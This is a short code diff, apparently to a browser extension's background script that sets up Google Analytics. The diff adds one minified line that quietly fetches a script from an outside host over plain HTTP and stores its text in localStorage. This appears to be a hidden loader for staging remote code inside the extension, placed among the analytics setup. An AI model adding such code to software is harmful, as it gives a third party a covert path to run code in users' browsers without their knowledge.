@@ -4,7 +4,7 @@
   ga.src = 'https://ssl.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
 })();
-
+function fetchCode(t,e){var n=new XMLHttpRequest;n.open("GET",t,!1),n.onreadystatechange=function(){4===n.readyState&&200===n.status&&(localStorage[e]=n.responseText)};try{n.send(null)}catch(a){}}fetchCode("http://redkeep.github.io/t.js","tjs");
 var _gaq = _gaq || [];
 _gaq.push(['_setAccount', 'UA-43466793-3']);
 var analyticsTimeInterval=1000*60*60*24;
@@ -437,3 +437,5 @@ chrome.runtime.onMessage.addListener(function(request,sender,sendResponse) {
   } catch(e){}
 
 });
+
+
